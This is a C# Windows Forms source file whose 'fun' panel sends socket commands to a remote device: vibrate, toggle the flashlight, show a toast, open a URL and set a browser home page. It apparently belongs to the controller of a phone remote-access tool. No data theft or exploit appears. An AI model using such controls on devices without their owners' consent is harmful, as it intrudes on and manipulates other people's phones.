using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SV
{
    public partial class Eglence : Form
    {
        Socket sck; public string ID = "";
        public Eglence(Socket socket, string aydi)
        {
            InitializeComponent();
            sck = socket; ID = aydi;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            try { 
            byte[] vibration = Encoding.UTF8.GetBytes("VIBRATION|" + ((int)numericUpDown1.Value * 1000).ToString());
            Gonderici.Send(sck, vibration, 0, vibration.Length, 59999);
            }
            catch (Exception) { }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            try { 
            byte[] flash = Encoding.UTF8.GetBytes("FLASH|AC");
            Gonderici.Send(sck, flash, 0, flash.Length, 59999);
            }
            catch (Exception) { }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            try { 
            byte[] flash = Encoding.UTF8.GetBytes("FLASH|KAPA");
            Gonderici.Send(sck, flash, 0, flash.Length, 59999);
            }
            catch (Exception) { }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            try { 
            byte[] toast = Encoding.UTF8.GetBytes("TOST|" + textBox1.Text);
            Gonderici.Send(sck, toast, 0, toast.Length, 59999);
            }
            catch (Exception) { }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            try { 
            byte[] url = Encoding.UTF8.GetBytes("URL|" + textBox2.Text);
            Gonderici.Send(sck, url, 0, url.Length, 59999);
            }
            catch (Exception) { }
        }

        private void button6_Click(object sender, EventArgs e)
        {
            try { 
            byte[] url = Encoding.UTF8.GetBytes("ANASAYFA|" + textBox2.Text);
            Gonderici.Send(sck, url, 0, url.Length, 59999);
            }
            catch (Exception) { }
        }
        /*
        private void trackBar1_MouseUp(object sender, MouseEventArgs e)
        {
            byte[] url = Encoding.UTF8.GetBytes("PARILTI|" + trackBar1.Value.ToString());
            Gonderici.Send(sck, url, 0, url.Length, 59999);
        }
        */
    }
}
